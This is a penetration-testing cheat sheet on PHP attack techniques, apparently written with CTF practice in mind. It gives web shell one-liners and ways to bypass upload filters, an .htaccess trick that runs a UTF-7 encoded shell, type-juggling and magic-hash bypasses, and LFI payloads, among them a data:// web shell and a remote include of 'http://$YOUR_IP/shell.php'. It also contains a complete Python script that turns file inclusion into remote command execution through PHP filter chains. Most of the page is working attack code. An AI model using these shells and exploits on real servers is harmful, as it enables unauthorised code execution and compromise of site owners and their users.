---
description: Some tricks specific to the PHP web programming language
---

# PHP

## Shell Upload (RCE)

```php
<?php system($_GET["cmd"]) ?>
```

Bypass `<?php` with alternative prefixes:

<pre class="language-php"><code class="lang-php"><strong>&#x3C;?= system($_GET["cmd"]) ?>  // Universal (echo's result automatically)
</strong>
<strong>&#x3C;?system($_GET["cmd"])?>  // Supported on some servers
</strong>
<strong>&#x3C;script language="php">system($_GET["cmd"])&#x3C;/script>  // PHP &#x3C; 7
</strong></code></pre>

<pre class="language-php" data-title="Shortest (14-15 bytes)"><code class="lang-php">// Execute with /shell.php?0=id
<strong>&#x3C;?=`$_GET[0]`;
</strong>
<strong>&#x3C;?=`$_GET[0]`?>ANYTHING
</strong></code></pre>

### .htaccess

Upload `.htaccess` file to alter the directory, and bypass strong filters

{% embed url="https://jorianwoltjer.com/blog/post/ctf/challenge-the-cyber-2022/file-upload-training-mission" %}
Writeup of challenge that blocks any PHP extension or `<?` string
{% endembed %}

{% code title=".htaccess" %}
```apacheconf
# Allow .asp files to be served as PHP
AddType application/x-httpd-php .asp
# Set the encoding to UTF-7
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```
{% endcode %}

{% code title="shell.asp" %}
```
+ADw-?php+ACA-system(+ACQ-+AF8-GET+AFs-+ACI-cmd+ACI-+AF0-)+ACA-?+AD4-
```
{% endcode %}

{% embed url="https://github.com/wireghoul/htshells" %}
Repository containing various tricks to get RCE using .htaccess files alone
{% endembed %}

## Type Juggling

When code uses `==` or `!=` instead of `===` or `!==` the user may use certain strings to do weird stuff with PHP converting strings to integers

```php
# true in PHP 4.3.0+
'0e0' == '0e1'
'0e0' == '0E1'
'10e2' == ' 01e3'
'10e2' == '01e3'
'10e2' == '1e3'
'010e2' == '1e3'
'010e2' == '01e3'
'10' == '010'
'10.0' == '10'
'10' == '00000000010'
'12345678' == '00000000012345678'
'0010e2' == '1e3'
'123000' == '123e3'
'123000e2' == '123e5'

# true in 5.2.1+
# false in PHP 4.3.0 - 5.2.0
'608E-4234' == '272E-3063'

# true in PHP 4.3.0 - 5.6.x
# false in 7.0.0+
'0e0' == '0x0'
'0xABC' == '0xabc'
'0xABCdef' == '0xabcDEF'
'000000e1' == '0x000000'
'0xABFe1' == '0xABFE1'
'0xe' == '0Xe'
'0xABCDEF' == '11259375'
'0xABCDEF123' == '46118400291'
'0x1234AB' == '1193131'
'0x1234Ab' == '1193131'

# true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x
# false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+
'0xABCdef' == ' 0xabcDEF'
'1e1' == '0xa'
'0xe' == ' 0Xe'
'0x123' == ' 0x123'

# true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0
# false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+
'0e0' == '0x0a'

# true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2
# false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+
'0xe' == ' 0Xe.'
```

### Magic Hashes

{% embed url="https://github.com/spaze/hashes" %}
Collection of weird hashes that can be used for PHP Type Juggling
{% endembed %}

```
md5: 240610708:0e462097431906509019562988736854
sha1: aaroZmOk:0e66507019969427134894567494305185566735
sha256: 34250003024812:0e46289032038065916139621039085883773413820991920706299695051332
```

### Comparison rules

In PHP (< 8.0) the following table of rules applies when loosely comparing variables:

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>A table showing common loose comparisons with interesting values</p></figcaption></figure>

For a complete and detailed guide on every possible comparison between types, see [the PHP docs](https://www.php.net/manual/en/language.types.type-juggling.php).&#x20;

{% hint style="warning" %}
The `"php" == 0` case was so weird, that from PHP 8.0 onward, this is no longer true. However, the `"php" == true` still works ([see test](https://onlinephp.io/c/b435e)).
{% endhint %}

## Local File Inclusion

When some code uses the `include`, `include_once`, `require` or `require_once` keyword to include a file from user input (eg. `$_GET['page']`) you can include any file on the system using Directory Traversal.&#x20;

The functions run PHP code in the files that are included. If you can upload any file, put PHP code in there, and when you include it, it will be executed.&#x20;

If the response is PHP code, it will be executed and not shown to you, which could be a problem. If you want to read source-code of the `.php` files, you can use the following PHP filter to convert the file to base64 before interpreting it:

```url
php://filter/convert.base64-encode/resource=index.php
```

{% hint style="info" %}
You can read PHP files like this even if `.php` is appended to your input in the code. Because the last part of this PHP filter is `.php` you can just remove it and let the code add it back
{% endhint %}

### RCE using PHP Filters

The main goal for getting RCE from LFI is to get some arbitrary content returned by the URL, which is then included and read as PHP code. If you control the start of the URL in some include function, you can use [PHP Wrappers](https://www.php.net/manual/en/wrappers.php) to get content from other places than straight from a file. The `data://` wrapper for example can return arbitrary content, for example, using the `base64` encoding:

{% code title="PHP wrappers with a shell" %}
```url
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSkgPz4=
http://$YOUR_IP/shell.php
```
{% endcode %}

However, in more recent versions of PHP, the `allow_url_include=` option which enables some of these wrappers is **disabled by default**. However, there is a really powerful technique that I came across recently [found by loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) which combines lots of PHP filters to turn any file into arbitrary PHP code. For this, you only need to have **control of the start** to allow PHP wrappers, and then have a valid file anywhere to transform into PHP code. But you'll have a valid file anyways from the default functionality of the site, so this is pretty much a guarantee.&#x20;

{% code title="Example vulnerable code" %}
```php
<?php include $_GET["page"] + ".php" ?>
```
{% endcode %}

Read the writeup linked above to understand how they found it, but here's the basic idea:

* `convert.iconv.UTF8.CSISO2022KR` will always prepend `\x1b$)C` to the string
* `convert.base64-decode` is extremely tolerant, it will basically just ignore any characters that aren't valid base64.

Combining these and a lot of `convert.iconv` to convert between encodings, we can get any arbitrary base64 string that we can decode and include. Here's the exploit script used to automatically do this for a PHP shell, and then execute commands using it:

```python
import requests

url = "http://localhost/index.php"  # CHANGE to vulnerable URL
file_to_use = "/etc/passwd"  # CHANGE to any file on target
command = "/readflag"  # CHANGE to command to be executed

#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}


# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={
    "0": command,
    "action": "include",    
    "file": final_payload   # CHANGE to parameter where file is included
})

print(r.text)
```

For arbitrary contents instead of just the ``<?=`$_GET[0]`;;?>`` needed here, check out the [list of all base64 characters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters#improvements) that Carlos Polop made.&#x20;

### RCE using Session

Another way is using PHP sessions, which store your session data in `/tmp/sess_[PHPSESSID]` which you can access using your own `PHPSESSID=` cookie on the site. Anything saved to `$_SESSION[]` in the code will be saved to this file. If you put PHP code into your session and include it, the PHP code will be executed

{% embed url="https://jorianwoltjer.com/blog/post/ctf/cyber-apocalypse-2021/extortion" %}
A short writeup showing this attack in practice
{% endembed %}

### RCE using logs

You can include log files with your input in them, which can contain PHP code to be executed on include. The `User-Agent` is often saved to logs

{% code title="Common log file locations" %}
```
/var/log/apache2/access.log
/var/log/httpd/access.log
/var/log/nginx/access.log
```
{% endcode %}

If you can't find the logs you might be able to find it by looking at the configuration of the server, you can include/read any file after all

{% code title="Common config file locations" %}
```
/etc/apache2/apache2.conf
/opt/apache2/apache2.conf
/usr/local/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf
/usr/local/etc/httpd/httpd.conf
```
{% endcode %}

## Tricks

Any interesting tricks that are PHP specific

### Parameter filter bypass

{% embed url="https://www.idontplaydarts.com/2013/06/http-parameter-pollution-with-cookies-in-php/" %}

PHP turns `[` into `_` with the `parse_str` function. This can bypass checks looking for a name with an underscore. (Also works with cookies, which can even permanently overwrite cookies)

```
user_id=123&user[id=456
```
